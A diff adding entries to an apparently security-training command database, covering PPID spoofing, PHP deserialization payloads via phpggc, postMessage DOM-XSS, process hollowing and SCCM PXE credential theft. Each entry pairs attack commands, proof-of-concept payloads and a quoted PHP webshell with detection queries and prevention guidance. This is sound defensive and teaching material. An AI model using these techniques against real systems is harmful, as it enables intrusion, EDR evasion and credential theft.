+      "notes": "=== MECHANISM (Win32) ===\n  InitializeProcThreadAttributeList\n  UpdateProcThreadAttribute(..., PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, ...)\n  # child's PPID in the kernel points at hParent; the child also inherits that parent's token.\n  CreateProcess(..., EXTENDED_STARTUPINFO_PRESENT, &si.StartupInfo, &pi)\n\n=== BLOCKDLLS (pair with it) ===\n  UpdateProcThreadAttribute(..., PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,\n     PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON ...)\n  # prevents non-Microsoft-signed DLLs (many EDR user-mode hooks) from loading into the child.\n\n=== WHY IT EVADES ===\n  - Breaks \"Office spawned a shell\" and similar parent-child detections.\n  - Child inherits the spoofed parent's security token (handle must have PROCESS_CREATE_PROCESS).\n  - BlockDLLs strips the EDR's in-process visibility.\n\n=== TELLS ===\n  - PPID points at a parent that did not actually call CreateProcess (ETW process-start parent vs\n    kernel callback parent mismatch).\n  - Built into Cobalt Strike (ppid / blockdlls), available in many loaders.\n\n=== ALTERNATIVES ===\n  Process hollowing (identity via image), direct token theft, scheduled-task spawning.",
+      "examples": [
+        {
+          "label": "Enumerate parent-child relationships to baseline (defender view)",
+          "command": "Get-CimInstance Win32_Process | Select ProcessId,ParentProcessId,Name"
+        },
+        {
+          "label": "Cobalt-style operator syntax (reference)",
+          "command": "ppid 1234; blockdlls start; spawnto x64 %windir%\\sysnative\\dllhost.exe"
+        }
+      ],
+      "references": [
+        {
+          "title": "MITRE ATT&CK T1134.004 - Parent PID Spoofing",
+          "url": "https://attack.mitre.org/techniques/T1134/004/"
+        },
+        {
+          "title": "Microsoft - UpdateProcThreadAttribute",
+          "url": "https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "win-process-hollowing",
+          "note": "Hollowing fakes the image; PPID spoofing fakes the parent - often combined.",
+          "rel": "alternative"
+        },
+        {
+          "id": "process-injection-runner",
+          "note": "PPID spoofing commonly precedes injecting into the spoofed child.",
+          "rel": "prereq"
+        },
+        {
+          "id": "av-evasion-methods",
+          "note": "Where parent-child spoofing fits in evasion.",
+          "rel": "next"
+        }
+      ],
+      "defense": {
+        "why_it_works": "The ProcessParameters parent handle supplied through PROC_THREAD_ATTRIBUTE_PARENT_PROCESS sets the PPID recorded in the process object, and the child inherits that parent's token. Detections that trust the recorded PPID (e.g. flagging Office spawning a shell) are blinded, and BlockDLLs removes the EDR's user-mode hooks from the new process.",
+        "prerequisites": "Code execution and a handle to the chosen parent with PROCESS_CREATE_PROCESS rights. Spoofing a higher-integrity parent still requires rights to that process (often admin/SYSTEM).",
+        "impact": "T1134.004 Access Token Manipulation: Parent PID Spoofing. Breaks parent-child detection logic, can inherit a more trusted token, and (with BlockDLLs) strips EDR user-mode visibility from the child.",
+        "detection": "Correlate the kernel process-creation callback parent (authoritative, via EDR/ETW Microsoft-Windows-Kernel-Process) against the recorded PPID; a mismatch is high-fidelity. Also alert on the BlockDLLs mitigation policy being set on a non-Microsoft-launched process, and on blocked non-Microsoft DLL load events (code-integrity 3033).",
+        "artifacts": "ETW Microsoft-Windows-Kernel-Process process-start vs Sysmon EID 1 ParentImage mismatch; CodeIntegrity 3033 (image did not meet signing requirement for the BlockDLLs process); Sysmon EID 1 showing a child of explorer.exe that explorer never created.",
+        "splunk_spl": "index=sysmon EventCode=1\n| eval kernel_parent=ParentProcessGuid\n| join type=left ProcessGuid [search index=etw sourcetype=\"Kernel-Process\" | fields ProcessGuid, RealParentImage]\n| where isnotnull(RealParentImage) AND RealParentImage!=ParentImage\n| table _time, Computer, Image, ParentImage, RealParentImage",
+        "elastic_kql": "event.code:\"1\" and process.parent.name:explorer.exe and not process.parent.executable:\"C\\:\\\\Windows\\\\explorer.exe\"",
+        "sentinel_kql": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"explorer.exe\"\n| where InitiatingProcessParentFileName !in~ (\"userinit.exe\",\"winlogon.exe\")\n| project Timestamp, DeviceName, FileName, InitiatingProcessFileName, InitiatingProcessParentFileName",
+        "sigma_rules": "proc_creation_win_ppid_spoofing_parent_mismatch",
+        "prevention": "Rely on EDR that reports the authoritative kernel parent rather than the recorded PPID; enable Protected Process Light for EDR so BlockDLLs cannot strip a kernel sensor; apply ASR and WDAC so the spoofed child still cannot load unsigned code; restrict handle rights to sensitive parents (explorer, lsass) via least privilege.",
+        "sources": [
+          "https://attack.mitre.org/techniques/T1134/004/",
+          "https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "Recorded parent does not match kernel launcher",
+            "logic": "DeviceProcessEvents\n| where InitiatingProcessFileName in~ (\"explorer.exe\",\"svchost.exe\")\n| where InitiatingProcessParentFileName !in~ (\"userinit.exe\",\"winlogon.exe\",\"services.exe\")\n| project Timestamp, DeviceName, FileName, InitiatingProcessFileName, InitiatingProcessParentFileName",
+            "data_source": "defender-endpoint",
+            "attack": [
+              "T1134.004"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "medium",
+            "false_positives": "Shell restarts and some login flows",
+            "tuning": "Baseline legitimate explorer/svchost parents per environment"
+          },
+          {
+            "platform": "splunk",
+            "name": "BlockDLLs - non-Microsoft image load blocked (CodeIntegrity 3033)",
+            "logic": "index=wineventlog source=\"*CodeIntegrity*\" EventCode=3033\n| table _time, Computer, ProcessName, FileNameBuffer",
+            "data_source": "windows-system",
+            "attack": [
+              "T1134.004",
+              "T1134"
+            ],
+            "fidelity": "signature",
+            "confidence": "high",
+            "false_positives": "Rare; some legitimate software sets binary signature policy",
+            "tuning": "Allowlist known hardened applications that enable BlockDLLs themselves"
+          }
+        ],
+        "visibility": {
+          "requires": [
+            "sysmon",
+            "edr"
+          ],
+          "better_with": [
+            "defender-endpoint",
+            "etw"
+          ]
+        }
       }
     },
     {
@@ -116613,6 +120409,116 @@ const COMMAND_DATA = {
         }
       ],
       "explain": "WhiteWinterWolf's PHP web shell is a compact, feature-rich shell for PHP targets.\nWhen an upload filter checks MIME, intercept in Burp and set Content-Type: image/gif.\nA one-line PHP webshell (`<?php system($_GET['cmd']); ?>`) gives command exec via the browser."
+    },
+    {
+      "id": "deser-php-phpggc",
+      "name": "phpggc - PHP Object Injection Gadget Chains",
+      "command": "phpggc <framework>/<chain> <function> \"<command>\"",
+      "description": "phpggc generates PHP object-injection (unserialize) payloads using gadget chains in popular frameworks and libraries (Laravel, Symfony, Monolog, Guzzle, Doctrine, WordPress). When an app calls unserialize() on attacker data, crafted objects trigger magic methods (__wakeup, __destruct, __toString) that chain into file writes or command execution. phpggc also builds phar archives to exploit phar:// deserialization reached through file functions.",
+      "platform": "multi",
+      "type": "command",
+      "opsec": "quiet",
+      "category": "Web Exploitation",
+      "subcategory": "Deserialization",
+      "certifications": [
+        "OSCP",
+        "CPTS"
+      ],
+      "primary_cert": "CPTS",
+      "source": "ambionics/phpggc",
+      "tags": [
+        "deserialization",
+        "phpggc",
+        "php",
+        "object-injection",
+        "phar",
+        "laravel",
+        "symfony",
+        "monolog",
+        "rce"
+      ],
+      "mitre": [
+        "T1190",
+        "T1059"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== IDENTIFY A PHP UNSERIALIZE SINK ===\n  # Serialized PHP looks like: O:4:\"User\":2:{...} (object) or a:2:{...} (array).\n  # Sinks: unserialize($_GET/_POST/cookie), or file funcs reachable with phar:// (fopen/file_get_contents/getimagesize).\n\n=== LIST AVAILABLE CHAINS ===\n  phpggc -l                 # all chains\n  phpggc -l laravel         # filter by framework\n  phpggc -i Laravel/RCE1    # info/requirements for one chain\n\n=== GENERATE A PAYLOAD ===\n  phpggc Laravel/RCE1 system id\n  phpggc Symfony/RCE4 exec \"id\"\n  phpggc Monolog/RCE1 system \"id\"\n  phpggc Guzzle/RCE1 system id\n  # Base64 / URL encode for transport:\n  phpggc -b Laravel/RCE1 system id       # base64\n  phpggc -u Laravel/RCE1 system id       # url-encoded\n\n=== PHAR DESERIALIZATION (file-function sinks, no unserialize call needed) ===\n  # Build a polyglot phar whose metadata is the gadget, then reach it with a phar:// path.\n  phpggc -p phar -o /tmp/evil.phar Monolog/RCE1 system id\n  # Upload evil.phar (often as evil.gif), then trigger:\n  #   file_get_contents(\"phar:///var/www/uploads/evil.gif\")  -> deserializes metadata\n  phpggc -pj phar -o evil.phar Monolog/RCE1 system id   # phar+jpeg polyglot\n\n=== MAGIC METHODS THAT DRIVE THE CHAIN ===\n  __wakeup()   fires on unserialize()\n  __destruct() fires when the object is garbage-collected\n  __toString() fires when the object is treated as a string\n\n=== ALTERNATIVES ===\n  Hand-craft objects when no framework chain fits (PHPGGC covers most)\n  LFI phar:// wrapper card for the phar trigger mechanics",
+      "examples": [
+        {
+          "label": "Laravel unserialize RCE",
+          "command": "phpggc Laravel/RCE1 system id"
+        },
+        {
+          "label": "Base64 Monolog payload for a cookie",
+          "command": "phpggc -b Monolog/RCE1 system \"id\""
+        },
+        {
+          "label": "Phar/jpeg polyglot for a file-function sink",
+          "command": "phpggc -pj phar -o evil.phar Monolog/RCE1 system id"
+        }
+      ],
+      "references": [
+        {
+          "title": "ambionics/phpggc",
+          "url": "https://github.com/ambionics/phpggc"
+        },
+        {
+          "title": "PortSwigger - PHP phar deserialization",
+          "url": "https://portswigger.net/web-security/deserialization/exploiting"
+        },
+        {
+          "title": "OWASP Deserialization Cheat Sheet",
+          "url": "https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "exploit-deserialization",
+          "note": "Generic multi-language deserialization hub card.",
+          "rel": "prereq"
+        },
+        {
+          "id": "deser-nodejs",
+          "note": "Node.js serialization RCE, a sibling runtime.",
+          "rel": "alternative"
+        },
+        {
+          "id": "deser-python-pickle",
+          "note": "Python pickle RCE, a sibling runtime.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "PHP unserialize() rebuilds arbitrary objects and runs their magic methods. Gadget chains in bundled libraries route __destruct/__wakeup into file writes or process execution. phar:// smuggles the same object graph through any file-system function, so even code that never calls unserialize() can be hit.",
+        "prerequisites": "A reachable unserialize() on user input, or a file function accepting a phar:// path plus a way to upload the phar; a library with a usable gadget chain in the codebase.",
+        "impact": "Remote code execution as the web server / PHP-FPM user.",
+        "detection": "[MITRE T1190] Requests with O:<n>: or a:<n>:{ serialized objects, or phar:// in parameters/uploaded file metadata; [MITRE T1059] php/php-fpm spawning sh/bash as children.",
+        "artifacts": "Apache/Nginx access logs with serialized blobs or phar:// strings; uploaded files whose trailing bytes contain __HALT_COMPILER() (phar signature); EDR process tree php-fpm -> sh.",
+        "splunk_spl": "index=web (request_body=\"*phar://*\" OR request_body=\"O:*:*{*\" OR uri_query=\"*phar%3A%2F%2F*\")\n| table _time, src_ip, uri_path, request_body",
+        "elastic_kql": "http.request.body.content:(*phar\\:\\/\\/* or O\\:*) or url.query:*phar*",
+        "sentinel_kql": "DeviceProcessEvents\n| where InitiatingProcessFileName in~ (\"php\",\"php-fpm\",\"php-cgi\",\"httpd\",\"nginx\")\n| where FileName in~ (\"sh\",\"bash\",\"dash\")\n| project TimeGenerated, DeviceName, InitiatingProcessCommandLine, FileName, ProcessCommandLine",
+        "sigma_rules": "web_php_object_injection_phar_or_shell_child",
+        "prevention": "Never unserialize() untrusted input; use json_decode for data. If unavoidable, pass allowed_classes=false. Validate uploaded file content and block phar:// via disable wrappers / PHP 8 phar read-only defaults; keep frameworks patched; run PHP-FPM least-privileged.",
+        "sources": [
+          "ambionics/phpggc",
+          "https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html"
+        ],
+        "detections": [
+          {
+            "platform": "splunk",
+            "name": "PHP serialized object or phar:// in web request",
+            "logic": "index=web (request_body=\"*phar://*\" OR request_body=\"O:*:*{*\" OR uri_query=\"*phar%3A%2F%2F*\")\n| stats count by src_ip, uri_path\n| where count > 0",
+            "data_source": "apache",
+            "attack": [
+              "T1190"
+            ],
+            "fidelity": "signature",
+            "confidence": "medium",
+            "false_positives": "Apps that legitimately pass serialized session data in requests",
+            "tuning": "Focus on endpoints that accept serialized input or file paths; correlate with a php-fpm child shell"
+          }
+        ]
+      }
     },
     {
       "type": "command",
@@ -119491,6 +123397,112 @@ const COMMAND_DATA = {
         "T1591"
       ],
       "explain": "Post-Engagement - Report Structure - reference (methodology, not a runnable command).\nReport components: attack chain narrative; executive summary (non-technical); detailed findings (risk rating, impact, remediation, external refs); steps to reproduce each finding; near/medium/long-term recommendations; appendices (scope, OSINT, cracked passwords, ports/services, compromised hosts/accounts, files transferred, system modifications, AD analysis, scan data)."
+    },
+    {
+      "id": "web-postmessage-exploitation",
+      "name": "postMessage / DOM Origin-Validation Flaws",
+      "command": "targetWindow.postMessage(payload, '*')",
+      "description": "Exploits insecure cross-window messaging: a page registers a message event listener that trusts data without checking event.origin (or uses a weak check), then passes it to a dangerous sink (innerHTML, eval, document.write, location) causing DOM XSS, or the sending side posts sensitive data with targetOrigin '*' leaking it to any framing attacker. Covers finding listeners, origin-check bypasses, and the iframe PoC that sends a malicious message.",
+      "platform": "multi",
+      "type": "command",
+      "opsec": "quiet",
+      "category": "Web",
+      "subcategory": "Client-Side",
+      "certifications": [
+        "CWES"
+      ],
+      "primary_cert": "CWES",
+      "source": "PortSwigger Web Security Academy - DOM-based / Web Messaging",
+      "tags": [
+        "postmessage",
+        "dom-xss",
+        "web-messaging",
+        "origin-validation",
+        "client-side"
+      ],
+      "mitre": [
+        "T1185",
+        "T1059.007"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== WHY IT WORKS ===\n  window.postMessage enables cross-origin window/iframe messaging. Two failure modes:\n  1. RECEIVER trusts e.data without validating e.origin, then sinks it (innerHTML/eval/location) -> DOM XSS or redirect.\n  2. SENDER calls postMessage(secret, '*') with a wildcard targetOrigin, so any page that framed the target reads the secret.\n\n=== FIND LISTENERS ===\n  - grep the JS for addEventListener('message', ...) / onmessage.\n  - In DevTools: getEventListeners(window).message, or set a breakpoint on 'message' events.\n  - Look at what the handler does with e.data (e.g. $(...).html(e.data), eval(e.data.config), location = e.data.url).\n\n=== ORIGIN-CHECK BYPASSES ===\n  - No check at all.\n  - indexOf/startsWith check: origin.indexOf('example.com') > -1  bypass with https://example.com.attacker.com or https://attackerexample.com.\n  - Regex without anchors: /example\\.com/ matches evil-example.com.evil.\n\n=== EXPLOIT PoC (DOM XSS via innerHTML sink) ===\n  Host a page that frames the target and posts a payload:\n  <iframe src=\"https://<target>/\" onload=\"this.contentWindow.postMessage('<img src=x onerror=alert(document.domain)>','*')\"></iframe>\n\n=== DATA-THEFT PoC (wildcard sender) ===\n  Frame the target; your frame's own message listener captures the secret it broadcasts with '*'.\n\n=== TOOLING ===\n  - Burp + DOM Invader (built into Burp's embedded browser) auto-detects message listeners and sinks.\n  - Browser DevTools event listener breakpoints.",
+      "examples": [
+        {
+          "label": "iframe PoC posting a DOM-XSS payload",
+          "command": "<iframe src=\"https://<target>/\" onload=\"this.contentWindow.postMessage('<img src=x onerror=alert(document.domain)>','*')\"></iframe>"
+        },
+        {
+          "label": "Enumerate message listeners in DevTools",
+          "command": "getEventListeners(window).message"
+        },
+        {
+          "label": "Weak origin check bypassed by suffix domain",
+          "command": "// handler: if(e.origin.indexOf('example.com')>-1){...}  -> origin https://example.com.attacker.com"
+        }
+      ],
+      "references": [
+        {
+          "title": "PortSwigger - DOM-based vulnerabilities (web messages)",
+          "url": "https://portswigger.net/web-security/dom-based/controlling-the-web-message-source"
+        },
+        {
+          "title": "MDN - Window: postMessage() (security)",
+          "url": "https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage"
+        },
+        {
+          "title": "OWASP - DOM based XSS",
+          "url": "https://owasp.org/www-community/attacks/DOM_Based_XSS"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "xss-dom",
+          "note": "postMessage sinks are a specific DOM-XSS source/sink chain.",
+          "rel": "prereq"
+        },
+        {
+          "id": "web-websocket-hijacking",
+          "note": "Another client-side origin-trust flaw common in the same SPA.",
+          "rel": "alternative"
+        },
+        {
+          "id": "cors-misconfiguration",
+          "note": "CORS and postMessage are the two cross-origin data-leak surfaces to test together.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "A message event handler trusts attacker-controlled e.data without verifying e.origin (or with a bypassable substring/regex check) and passes it to a code/DOM sink; or a sender broadcasts sensitive data with targetOrigin '*', so a framing attacker receives it.",
+        "prerequisites": "A page with a message listener whose origin check is absent or weak and which sinks the data dangerously, or a sender using a wildcard targetOrigin. The attacker must be able to frame or open the target window.",
+        "impact": "DOM-based XSS (full client-side compromise, session/token theft, actions as the victim) and leakage of sensitive data broadcast over postMessage to attacker-controlled frames.",
+        "detection": "[MITRE T1185] Primarily client-side; server-side signals are indirect. CSP violation reports from injected scripts, and any resulting exfiltration requests to attacker domains after a victim frames the app.",
+        "artifacts": "Browser CSP report-uri/report-to endpoints, client-side error/telemetry logs, and web access logs showing the app being framed (Sec-Fetch-Dest=iframe) followed by outbound requests to unknown hosts.",
+        "splunk_spl": "index=web sourcetype=csp_report\n| spath input=_raw\n| rename csp-report.blocked-uri as blocked, csp-report.document-uri as doc\n| search doc=\"*<target>*\"\n| stats count by blocked, doc",
+        "elastic_kql": "labels.report_type:\"csp-violation\" and csp.document_uri:*<target>* and csp.effective_directive:(\"script-src\" or \"script-src-elem\")",
+        "sentinel_kql": "AppServiceHTTPLogs\n| where CsUriStem == \"/csp-report\"\n| extend blocked = extract(@\"blocked-uri\"\":\\s*\"\"([^\"\"]+)\", 1, tostring(Properties))\n| summarize count() by CIp, blocked",
+        "sigma_rules": "web_postmessage_dom_xss_csp_violation",
+        "prevention": "In every message handler, verify event.origin against an exact allow-list (strict equality, not substring/regex) before using the data. Validate and type-check e.data; never pass it to innerHTML/eval/document.write/location. Always specify an explicit targetOrigin (never '*') when posting sensitive data. Deploy a strict CSP as defense-in-depth.",
+        "sources": [
+          "https://portswigger.net/web-security/dom-based/controlling-the-web-message-source",
+          "https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage"
+        ],
+        "detections": [
+          {
+            "platform": "splunk",
+            "name": "CSP violation reports referencing the app (injected script)",
+            "logic": "index=web sourcetype=nginx uri_path=\"/csp-report\"\n| spath input=_raw\n| rename csp-report.effective-directive as directive, csp-report.blocked-uri as blocked, csp-report.document-uri as doc\n| search directive=\"script-src*\" doc=\"*<target>*\"\n| stats count by doc, blocked",
+            "data_source": "nginx",
+            "attack": [
+              "T1185",
+              "T1059.007"
+            ],
+            "fidelity": "telemetry",
+            "confidence": "low",
+            "false_positives": "Browser extensions and legitimate third-party scripts generate CSP noise.",
+            "tuning": "Baseline normal CSP reports; alert on new blocked-uri values correlated with inline-script/eval violations on sensitive pages."
+          }
+        ]
+      }
     },
     {
       "id": "powerhuntshares",
@@ -129574,6 +133586,126 @@ const COMMAND_DATA = {
       }
     },
     {
+      "id": "win-process-hollowing",
+      "name": "Process Hollowing (RunPE)",
+      "command": "CreateProcess suspended -> unmap image -> write payload -> SetThreadContext -> ResumeThread",
+      "description": "Process hollowing (RunPE) launches a legitimate signed process in a suspended state, unmaps its original image from memory, writes a malicious PE into the hollowed address space, repoints the entry point via the thread context, and resumes it. The payload then runs under the identity and image name of the trusted host process, defeating image-name-based allowlisting and blending into normal process listings.",
+      "platform": "windows",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Defense Evasion",
+      "subcategory": "Process Injection",
+      "certifications": [
+        "CRTP"
+      ],
+      "primary_cert": "CRTP",
+      "source": "MITRE ATT&CK T1055.012; public RunPE research",
+      "tags": [
+        "process-hollowing",
+        "runpe",
+        "process-injection",
+        "evasion",
+        "defense-evasion"
+      ],
+      "mitre": [
+        "T1055.012",
+        "T1055"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== CLASSIC RUNPE SEQUENCE (Win32 API) ===\n  1. CreateProcess(target, CREATE_SUSPENDED)        # e.g. a signed svchost/notepad\n  2. NtUnmapViewOfSection / NtQueryInformationProcess to find and unmap the base image\n  3. VirtualAllocEx at the preferred image base, WriteProcessMemory the PE headers + sections\n  4. GetThreadContext -> set the entry point (Rcx/Eax) -> SetThreadContext\n  5. ResumeThread                                   # payload runs as the host process\n\n=== WHY IT EVADES ===\n  - Process name, path, and signature on disk are the legitimate host binary.\n  - Static scanning of the on-disk image sees nothing malicious.\n\n=== TELLS LEFT BEHIND (for defenders / your own OPSEC) ===\n  - A private, executable region where a mapped image should be (image/private mismatch).\n  - PEB image base not matching the on-disk file.\n  - A child process with no command-line arguments spawned by an odd parent.\n\n=== VARIANTS ===\n  Process doppelganging (TxF), transacted hollowing, module stomping, and ghosting are\n  stealthier evolutions of the same idea.\n\n=== ALTERNATIVES ===\n  Classic DLL/shellcode injection (noisier), reflective loading, PPID spoofing to fix the parent.",
+      "examples": [
+        {
+          "label": "Baseline legitimate child-process behaviour before testing (defender view)",
+          "command": "Get-CimInstance Win32_Process | Select ProcessId,ParentProcessId,Name,CommandLine"
+        },
+        {
+          "label": "Spot a hollowed process: image base vs on-disk mismatch (Sysinternals)",
+          "command": "C:\\Sysinternals\\vmmap.exe -p <pid>"
+        }
+      ],
+      "references": [
+        {
+          "title": "MITRE ATT&CK T1055.012 - Process Hollowing",
+          "url": "https://attack.mitre.org/techniques/T1055/012/"
+        },
+        {
+          "title": "Elastic - Ten Process Injection Techniques",
+          "url": "https://www.elastic.co/blog/ten-process-injection-techniques-technical-survey-common-and-trending-process"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "process-injection-runner",
+          "note": "Standard shellcode injection as a simpler alternative.",
+          "rel": "alternative"
+        },
+        {
+          "id": "win-parent-pid-spoofing",
+          "note": "Spoof the parent of the hollowed process to fix the parent-child tell.",
+          "rel": "next"
+        },
+        {
+          "id": "donut-shellcode",
+          "note": "Donut converts a PE/assembly into position-independent shellcode to inject.",
+          "rel": "prereq"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Windows lets a parent create a suspended child and modify its memory and thread context before the first instruction runs. Unmapping the original image and writing a new PE leaves the kernel's process object (name, path, token) pointing at the legitimate binary while the running code is attacker-controlled, so identity-based controls are fooled.",
+        "prerequisites": "Code execution and the right to create a process and call WriteProcessMemory/SetThreadContext on it (same user, no admin required for a self-spawned child).",
+        "impact": "T1055.012 Process Hollowing. Malicious code executes with the image name, path, and often the signature of a trusted process, defeating image-name allowlisting and complicating triage.",
+        "detection": "Behavioural: a process created suspended that then has memory written and its thread context set before resume; a running image whose in-memory base does not match its on-disk file; executable PRIVATE memory where a mapped image is expected; a signed binary spawned with no command line by an unusual parent. EDR with memory-scanning and image-load correlation catches the mismatch.",
+        "artifacts": "Sysmon EID 1 (process create, often blank CommandLine); Sysmon EID 8 (CreateRemoteThread) or EID 10 (ProcessAccess with PROCESS_VM_WRITE/SET_CONTEXT); EDR memory-region integrity alerts; image/private memory mismatch reported by memory forensics (vmmap, Volatility malfind).",
+        "splunk_spl": "index=sysmon EventCode=10 GrantedAccess IN (\"0x1F0FFF\",\"0x1FFFFF\",\"0x0A\",\"0x1438\")\n| where SourceImage!=TargetImage\n| stats count by SourceImage, TargetImage, GrantedAccess, Computer",
+        "elastic_kql": "event.code:\"10\" and winlog.event_data.GrantedAccess:(\"0x1F0FFF\" or \"0x1FFFFF\") and not winlog.event_data.SourceImage:winlog.event_data.TargetImage",
+        "sentinel_kql": "DeviceProcessEvents\n| where ProcessCreationFlags has \"CREATE_SUSPENDED\" or isempty(ProcessCommandLine)\n| join kind=inner (DeviceEvents | where ActionType in (\"WriteToProcessMemory\",\"SetThreadContext\")) on DeviceName\n| project Timestamp, DeviceName, FileName, InitiatingProcessFileName, ActionType",
+        "sigma_rules": "proc_access_win_process_hollowing_vmwrite_setcontext",
+        "prevention": "Deploy EDR with runtime memory integrity / in-memory scanning; enable Microsoft ASR rules and Exploit Protection (code integrity guard, arbitrary code guard) on sensitive processes; use WDAC so even correctly-named processes must load only signed code; alert on signed binaries spawned suspended with empty command lines from unexpected parents.",
+        "sources": [
+          "https://attack.mitre.org/techniques/T1055/012/",
+          "https://www.elastic.co/blog/ten-process-injection-techniques-technical-survey-common-and-trending-process"
+        ],
+        "detections": [
+          {
+            "platform": "splunk",
+            "name": "Cross-process VM write with set-context access rights",
+            "logic": "index=sysmon EventCode=10 GrantedAccess IN (\"0x1F0FFF\",\"0x1FFFFF\",\"0x1438\") SourceImage!=TargetImage\n| stats count by SourceImage, TargetImage, GrantedAccess, Computer",
+            "data_source": "sysmon",
+            "attack": [
+              "T1055.012"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "medium",
+            "false_positives": "Debuggers and some installers legitimately write to other processes",
+            "tuning": "Allowlist debuggers/AV; weight unsigned SourceImage higher"
+          },
+          {
+            "platform": "sentinel",
+            "name": "Signed binary spawned suspended with empty command line",
+            "logic": "DeviceProcessEvents\n| where isempty(ProcessCommandLine)\n| where FileName in~ (\"svchost.exe\",\"notepad.exe\",\"explorer.exe\",\"rundll32.exe\")\n| where InitiatingProcessFileName !in~ (\"services.exe\",\"explorer.exe\")\n| project Timestamp, DeviceName, FileName, InitiatingProcessFileName",
+            "data_source": "defender-endpoint",
+            "attack": [
+              "T1055.012",
+              "T1055"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "medium",
+            "false_positives": "Some service hosts start with minimal command lines",
+            "tuning": "Baseline legitimate parents of each host binary"
+          }
+        ],
+        "visibility": {
+          "requires": [
+            "sysmon",
+            "edr"
+          ],
+          "better_with": [
+            "defender-endpoint"
+          ]
+        }
+      }
+    },
+    {
       "type": "command",
       "platform": "linux",
       "requires": [
@@ -131220,6 +135352,109 @@ const COMMAND_DATA = {
       }
     },
     {
+      "id": "sccm-pxe-media-abuse",
+      "name": "pxethief - SCCM PXE Boot Media Abuse",
+      "command": "python pxethief.py 2 <ip>",
+      "description": "SCCM PXE-enabled Distribution Points serve OS-deployment boot media (a password-protected .pxe / variables blob) over TFTP. pxethief requests the PXE media, recovers or cracks the (often weak or absent) media password, and decrypts the task-sequence variables - which routinely contain domain-join credentials, local admin passwords, and other secrets. A single unauthenticated PXE request to a DP can hand an attacker domain credentials.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Active Directory",
+      "subcategory": "SCCM Attacks",
+      "certifications": [
+        "CRTP"
+      ],
+      "primary_cert": "CRTP",
+      "source": "MWR-CyberSec/PXEThief",
+      "tags": [
+        "sccm",
+        "mecm",
+        "pxethief",
+        "pxe",
+        "task-sequence",
+        "credential-access",
+        "tftp"
+      ],
+      "mitre": [
+        "T1552.001",
+        "T1078.002"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== IDENTIFY PXE-ENABLED DPs ===\n  # Option 1 enumerates reachable PXE/DHCP responders:\n  python pxethief.py 1\n\n=== REQUEST + CRACK PXE MEDIA (unauthenticated) ===\n  # Request media variables from a specific PXE DP and auto-attempt the password:\n  python pxethief.py 2 <ip>\n  # Output includes the encrypted media file and, if cracked, the task-sequence vars\n\n=== CRACK THE MEDIA PASSWORD OFFLINE ===\n  # Extract the hash and feed hashcat (mode 19850 - SCCM PXE):\n  python pxethief.py 5 <pxe_variables_file>\n  hashcat -m 19850 <hash_file> <wordlist>\n\n=== DECRYPT TASK-SEQUENCE VARIABLES ===\n  python pxethief.py 3 <media_variables_file> <password>\n  # Reveals: OSDJoinAccount / OSDJoinPassword (domain-join creds),\n  #          local admin password, collection variables, cert blobs\n\n=== WHY IT WORKS ===\n  - PXE boot is reachable pre-authentication on the network segment.\n  - Media passwords are frequently blank, weak, or reused.\n  - Task-sequence variables store plaintext-recoverable domain-join creds.\n\n=== ALTERNATIVES ===\n  SharpSCCM get secrets        # policy-based secret theft\n  Snaffler / CMLoot            # content-based loot",
+      "examples": [
+        {
+          "label": "Discover PXE responders",
+          "command": "python pxethief.py 1"
+        },
+        {
+          "label": "Request + crack media from a DP",
+          "command": "python pxethief.py 2 <ip>"
+        },
+        {
+          "label": "Crack media password with hashcat",
+          "command": "hashcat -m 19850 <hash_file> <wordlist>"
+        }
+      ],
+      "references": [
+        {
+          "title": "PXEThief",
+          "url": "https://github.com/MWR-CyberSec/PXEThief"
+        },
+        {
+          "title": "Misconfiguration Manager - CRED-3 (PXE)",
+          "url": "https://github.com/subat0mik/Misconfiguration-Manager"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "sccm-sccmhunter-recon",
+          "note": "Locate PXE-enabled Distribution Points first.",
+          "rel": "prereq"
+        },
+        {
+          "id": "sccm-cmloot-dp-looting",
+          "note": "Another unauth-adjacent DP credential source.",
+          "rel": "alternative"
+        },
+        {
+          "id": "sccm-site-takeover-relay",
+          "note": "Escalate recovered creds toward site takeover.",
+          "rel": "next"
+        }
+      ],
+      "defense": {
+        "why_it_works": "PXE-enabled Distribution Points answer boot requests over TFTP before any authentication, and the media password protecting the boot variables is often blank, weak, or shared. The task-sequence variables carried in the media include domain-join and local-admin credentials in a recoverable form.",
+        "prerequisites": "Network reach to a PXE-enabled DP (same or routed DHCP/PXE segment). No credentials required for the initial request; a weak/blank media password for decryption.",
+        "impact": "Recovery of domain-join credentials, local administrator passwords, and task-sequence secrets from an unauthenticated network position.",
+        "detection": "[MITRE T1552.001] Unexpected PXE/TFTP boot requests from a host that is not a provisioning client; DHCP/PXE responder logs showing requests outside imaging windows; repeated TFTP reads of boot media.",
